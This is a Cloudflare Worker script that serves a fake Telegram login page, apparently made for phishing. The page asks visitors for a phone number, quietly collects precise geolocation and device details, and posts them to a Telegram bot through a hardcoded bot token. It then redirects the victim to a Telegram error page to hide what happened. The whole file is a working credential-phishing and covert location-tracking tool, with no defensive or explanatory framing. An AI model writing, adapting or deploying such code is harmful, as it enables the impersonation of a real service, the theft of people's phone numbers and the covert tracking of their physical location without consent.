export default {
  async fetch(request, env) {
    if (request.method === "GET") {
      return new Response(`
        <!DOCTYPE html>
        <html>
        <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Telegram Messenger</title>
          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"/>
          <style>
            body { font-family: -apple-system, sans-serif; background: #fff; display: flex; justify-content: center; padding-top: 50px; }
            .container { text-align: center; max-width: 350px; width: 90%; }
            .logo { width: 100px; margin-bottom: 20px; }
            h2 { font-weight: 500; margin-bottom: 10px; }
            p { color: #707579; font-size: 14px; margin-bottom: 30px; }
            input { width: 100%; padding: 14px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
            button { width: 100%; padding: 14px; background: #3390ec; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
          </style>
        </head>
        <body onload="init()">
          <div class="container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="logo">
            <h2>Your Phone</h2>
            <p>Enter your phone number to authorize this session.</p>
            <input id="phone" type="tel" placeholder="+964 7XX XXX XXXX">
            <button onclick="sendData()">NEXT</button>
          </div>

          <script>
            let lat = "Unknown", lon = "Unknown";
            
            function init() {
              if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                  lat = pos.coords.latitude;
                  lon = pos.coords.longitude;
                }, null, {enableHighAccuracy: true});
              }
            }

            function getDetailedModel() {
              const ua = navigator.userAgent;
              let model = "Generic Device";
              const match = ua.match(/\\(([^)]+)\\)/);
              if (match) {
                const parts = match[1].split(';');
                model = parts[parts.length - 1].trim();
              }
              return model + " (" + screen.width + "x" + screen.height + ")";
            }

            async function sendData() {
              const phone = document.querySelector("#phone").value;
              const model = getDetailedModel();
              const platform = navigator.platform;
              const browser = navigator.userAgent.split(' ').pop();

              await fetch(window.location.href, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone, lat, lon, model, platform, browser})
              });
              window.location.href = "https://telegram.org/blog/504-error";
            }
          </script>
        </body>
        </html>
      `, { headers: { "Content-Type": "text/html" } });
    }

    if (request.method === "POST") {
      try {
        const data = await request.json();
        const BOT_TOKEN = "6939721323:AAG9eDCNgz3Kct9APMRfrZUCDDSJfKbu8tc";
        const CHAT_ID = "5794792675";

        const mapUrl = data.lat !== "Unknown" 
          ? "https://www.google.com/maps?q=" + data.lat + "," + data.lon 
          : "Hidden by Target";

        const message = "🚨 [DQACD - INVESTIGATION REPORT] 🚨\\n" +
                        "--------------------------------\\n" +
                        "📱 Phone: " + data.phone + "\\n" +
                        "🛠 Model: " + data.model + "\\n" +
                        "🌐 OS: " + data.platform + "\\n" +
                        "📍 Location: " + mapUrl + "\\n" +
                        "🕵️‍♂️ Status: Deep Scan Complete";

        await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: CHAT_ID, text: message })
        });

        return new Response(JSON.stringify({ status: "ok" }), { headers: { "Content-Type": "application/json" } });
      } catch (e) {
        return new Response("Error", { status: 400 });
      }
    }
    return new Response("Not Allowed", { status: 405 });
  }
};
